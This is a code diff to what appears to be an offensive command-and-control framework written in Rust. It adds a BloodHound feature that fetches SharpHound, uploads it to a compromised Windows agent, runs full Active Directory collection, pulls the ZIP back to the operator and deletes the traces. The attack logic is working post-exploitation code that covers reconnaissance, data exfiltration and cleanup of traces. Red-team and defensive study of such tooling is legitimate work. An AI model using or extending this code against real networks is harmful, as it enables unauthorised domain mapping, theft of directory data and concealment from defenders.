@@ -517,6 +517,17 @@ async fn run_cli(server: Arc<LabyrinthServer>) -> Result<()> {
                             );
                         }
                     }
+                    "bloodhound" => {
+                        if let Err(e) = start_bloodhound_collection(&server).await {
+                            println!(
+                                "{}",
+                                styling::format_error_msg(
+                                    styling::ERROR_INDICATOR,
+                                    &format!("BloodHound collection failed: {}", e)
+                                )
+                            );
+                        }
+                    }
                     "upload" => {
                         if let Err(e) = start_upload_mode(&server).await {
                             println!(
@@ -1172,6 +1183,14 @@ mod tests {
             r"C:\Users\gMSA_ADFS_prod$\Documents\text"
         );
     }
+
+    #[tokio::test]
+    async fn test_find_or_download_sharphound() {
+        let result = find_or_download_sharphound().await;
+        assert!(result.is_ok(), "Expected Ok, got {:?}", result);
+        let path = result.unwrap();
+        assert!(path.exists(), "Path {:?} does not exist", path);
+    }
 }
 
 #[derive(Clone, Copy)]
@@ -1316,6 +1335,279 @@ impl Completer for ShellHelper {
     }
 }
 
+async fn start_bloodhound_collection(server: &LabyrinthServer) -> Result<()> {
+    let current_id = server.current_agent().read().await.clone();
+    let Some(agent_id) = current_id else {
+        println!(
+            "{}",
+            styling::format_warning_msg(
+                styling::WARNING_INDICATOR,
+                "No agent selected. Use 'select' command first."
+            )
+        );
+        return Ok(());
+    };
+
+    let (agent_name, agent_os, agent_sender, command_response) = {
+        let agents = server.agents().read().await;
+        let Some(agent) = agents.get(&agent_id) else {
+            println!(
+                "{}",
+                styling::format_error_msg(styling::ERROR_INDICATOR, "Selected agent not found")
+            );
+            return Ok(());
+        };
+
+        (
+            agent.info.name.clone(),
+            agent.info.os.clone(),
+            agent.sender.clone(),
+            agent.command_response.clone(),
+        )
+    };
+
+    if !agent_os.to_lowercase().contains("windows") {
+        println!(
+            "{}",
+            styling::format_warning_msg(
+                styling::WARNING_INDICATOR,
+                "BloodHound collection (SharpHound) is only supported on Windows agents."
+            )
+        );
+        return Ok(());
+    }
+
+    println!("\n{}", "BloodHound Collection (SharpHound)".cyan().bold());
+    println!("{}", "─────────────────────────────────".bright_black());
+
+    let exe_path = find_or_download_sharphound().await?;
+
+    let ts = SystemTime::now()
+        .duration_since(UNIX_EPOCH)
+        .map(|d| d.as_secs())
+        .unwrap_or(0);
+
+    let remote_exe = format!("C:\\Windows\\Temp\\SharpHound_{}.exe", ts);
+    let remote_zip_name = format!("BH_{}.zip", ts);
+    let remote_zip_path = format!("C:\\Windows\\Temp\\{}", remote_zip_name);
+
+    // 1. Upload SharpHound.exe
+    println!(
+        "{} Uploading SharpHound to agent...",
+        styling::INDENT_LEVEL_1
+    );
+    perform_upload(
+        &agent_name,
+        &agent_sender,
+        &command_response,
+        exe_path.to_str().unwrap(),
+        &remote_exe,
+    )
+    .await?;
+
+    // 2. Execute SharpHound
+    println!(
+        "{} Starting collection (this may take a few minutes)...",
+        styling::INDENT_LEVEL_1
+    );
+    let collect_cmd = format!(
+        "{} -c All,GPOLocations --zipfilename {}",
+        remote_exe, remote_zip_name
+    );
+
+    execute_remote_message(
+        &agent_name,
+        "bloodhound",
+        &collect_cmd,
+        &agent_sender,
+        &command_response,
+        Message::CommandRequest {
+            command: format!("windows:{}", collect_cmd),
+        },
+        Duration::from_secs(20 * 60), // 20 minutes timeout
+    )
+    .await;
+
+    // 3. Download the ZIP
+    println!(
+        "{} Downloading collected data...",
+        styling::INDENT_LEVEL_1
+    );
+    let artifacts_dir = PathBuf::from("labyrinth-artifacts");
+    if !artifacts_dir.exists() {
+        fs::create_dir_all(&artifacts_dir).map_err(|e| {
+            LabyrinthError::Message(format!("Failed to create artifacts directory: {}", e))
+        })?;
+    }
+    let local_zip_path = artifacts_dir.join(format!("{}_{}.zip", sanitize_filename(&agent_name), ts));
+
+    if let Err(e) = perform_download(
+        &agent_name,
+        &agent_sender,
+        &command_response,
+        &remote_zip_path,
+        local_zip_path.to_str().unwrap(),
+    )
+    .await
+    {
+        println!(
+            "{} Download failed: {}. Data might still be at {} on the agent.",
+            styling::format_warning_msg(styling::WARNING_INDICATOR, ""),
+            e,
+            remote_zip_path.cyan()
+        );
+    } else {
+        println!(
+            "{} Successfully downloaded BloodHound data to {}",
+            styling::format_success_msg(styling::SUCCESS_INDICATOR, ""),
+            local_zip_path.display().to_string().cyan()
+        );
+    }
+
+    // 4. Cleanup
+    println!("{} Cleaning up target...", styling::INDENT_LEVEL_1);
+    let cleanup_cmd = format!("del /f /q {} {}", remote_exe, remote_zip_path);
+    execute_remote_message(
+        &agent_name,
+        "cleanup",
+        "cleanup",
+        &agent_sender,
+        &command_response,
+        Message::CommandRequest {
+            command: format!("windows:{}", cleanup_cmd),
+        },
+        Duration::from_secs(30),
+    )
+    .await;
+
+    Ok(())
+}
+
+async fn find_or_download_sharphound() -> Result<PathBuf> {
+    let common_paths = [
+        "/usr/share/sharphound/SharpHound.exe",
+        "SharpHound.exe",
+        "labyrinth-artifacts/SharpHound.exe",
+    ];
+
+    for path in common_paths {
+        let p = PathBuf::from(path);
+        if p.exists() {
+            println!(
+                "{} Found SharpHound locally: {}",
+                styling::format_success_msg(styling::SUCCESS_INDICATOR, ""),
+                path.cyan()
+            );
+            return Ok(p);
+        }
+    }
+
+    // Try to find it with 'locate'
+    let output = std::process::Command::new("locate")
+        .arg("SharpHound.exe")
+        .output();
+    if let Ok(output) = output {
+        let s = String::from_utf8_lossy(&output.stdout);
+        if let Some(path) = s.lines().next() {
+            let p = PathBuf::from(path);
+            if p.exists() {
+                println!(
+                    "{} Found SharpHound via locate: {}",
+                    styling::format_success_msg(styling::SUCCESS_INDICATOR, ""),
+                    path.cyan()
+                );
+                return Ok(p);
+            }
+        }
+    }
+
+    // Download from GitHub
+    println!(
+        "{} SharpHound not found locally. Attempting to download from GitHub...",
+        styling::format_warning_msg(styling::WARNING_INDICATOR, "")
+    );
+
+    let artifacts_dir = PathBuf::from("labyrinth-artifacts");
+    if !artifacts_dir.exists() {
+        fs::create_dir_all(&artifacts_dir).map_err(|e| {
+            LabyrinthError::Message(format!("Failed to create artifacts directory: {}", e))
+        })?;
+    }
+
+    // Use curl to get the latest release page and find the SharpHound ZIP
+    let cmd = "curl -s https://api.github.com/repos/SpecterOps/SharpHound/releases/latest | grep \"browser_download_url.*zip\" | grep -v \"sha256\" | grep -v \"debug\" | cut -d '\"' -f 4 | head -n 1";
+    let output = std::process::Command::new("sh")
+        .arg("-c")
+        .arg(cmd)
+        .output()
+        .map_err(|e| LabyrinthError::Message(format!("Failed to execute curl: {}", e)))?;
+
+    let url = String::from_utf8_lossy(&output.stdout).trim().to_string();
+    if url.is_empty() {
+        return Err(LabyrinthError::Message(
+            "Could not find SharpHound download URL on GitHub".to_string(),
+        ));
+    }
+
+    println!(
+        "{} Downloading latest SharpHound from: {}",
+        styling::INDENT_LEVEL_1,
+        url.cyan()
+    );
+
+    let zip_path = artifacts_dir.join("SharpHound.zip");
+    let download_cmd = format!("curl -L -o {} {}", zip_path.display(), url);
+    std::process::Command::new("sh")
+        .arg("-c")
+        .arg(&download_cmd)
+        .output()
+        .map_err(|e| LabyrinthError::Message(format!("Failed to download SharpHound: {}", e)))?;
+
+    // Unzip
+    println!("{} Extracting SharpHound...", styling::INDENT_LEVEL_1);
+    let unzip_cmd = format!(
+        "unzip -o {} -d {}",
+        zip_path.display(),
+        artifacts_dir.display()
+    );
+    std::process::Command::new("sh")
+        .arg("-c")
+        .arg(&unzip_cmd)
+        .output()
+        .map_err(|e| LabyrinthError::Message(format!("Failed to extract SharpHound: {}", e)))?;
+
+    // Look for SharpHound.exe in the extracted files
+    let mut exe_path = artifacts_dir.join("SharpHound.exe");
+    if !exe_path.exists() {
+        // Try looking in subdirectories
+        let find_cmd = format!("find {} -name SharpHound.exe", artifacts_dir.display());
+        let find_output = std::process::Command::new("sh")
+            .arg("-c")
+            .arg(&find_cmd)
+            .output()
+            .map_err(|e| {
+                LabyrinthError::Message(format!("Failed to find extracted SharpHound.exe: {}", e))
+            })?;
+        let found = String::from_utf8_lossy(&find_output.stdout)
+            .trim()
+            .to_string();
+        if found.is_empty() {
+            return Err(LabyrinthError::Message(
+                "Could not find SharpHound.exe in extracted files".to_string(),
+            ));
+        }
+        exe_path = PathBuf::from(found);
+    }
+
+    println!(
+        "{} SharpHound downloaded and extracted to: {}",
+        styling::format_success_msg(styling::SUCCESS_INDICATOR, ""),
+        exe_path.display().to_string().cyan()
+    );
+
+    Ok(exe_path)
+}
+
 async fn start_commands_mode(server: &LabyrinthServer) -> Result<()> {
     let current_id = server.current_agent().read().await.clone();
     let Some(agent_id) = current_id else {
@@ -1448,6 +1740,7 @@ async fn start_commands_mode(server: &LabyrinthServer) -> Result<()> {
                 }
                 4 => {
                     if let Err(e) = start_shell_mode(
+                        server,
                         &agent_name,
                         selected_os,
                         &agent_sender,
@@ -1869,6 +2162,7 @@ async fn perform_download(
 }
 
 async fn start_shell_mode(
+    server: &LabyrinthServer,
     agent_name: &str,
     selected_os: CommandsOs,
     agent_sender: &mpsc::Sender<Message>,
@@ -1896,6 +2190,7 @@ async fn start_shell_mode(
         0 => start_raw_shell_mode(agent_name, agent_sender, shell_events).await,
         1 => {
             start_control_shell_mode(
+                server,
                 agent_name,
                 selected_os,
                 agent_sender,
@@ -1909,6 +2204,7 @@ async fn start_shell_mode(
 }
 
 async fn start_control_shell_mode(
+    server: &LabyrinthServer,
     agent_name: &str,
     selected_os: CommandsOs,
     agent_sender: &mpsc::Sender<Message>,
@@ -1940,6 +2236,7 @@ async fn start_control_shell_mode(
         "!history",
         "!upload",
         "!download",
+        "!bloodhound",
         "!sysenum",
         "!network",
         "!autoenum",
@@ -2170,6 +2467,18 @@ async fn start_control_shell_mode(
                 append_shell_transcript(
                     &transcript,
                     &format!("< download completed: {} -> {}", remote_path, local_path),
+                );
+            }
+            refresh_remote_shell_prompt(&session_id, agent_sender, &mut shell_rx, &transcript)
+                .await?;
+            continue;
+        }
+
+        if line == "!bloodhound" {
+            if let Err(e) = start_bloodhound_collection(server).await {
+                println!(
+                    "{}",
+                    styling::format_error_msg(styling::ERROR_INDICATOR, &e.to_string())
                 );
             }
             refresh_remote_shell_prompt(&session_id, agent_sender, &mut shell_rx, &transcript)
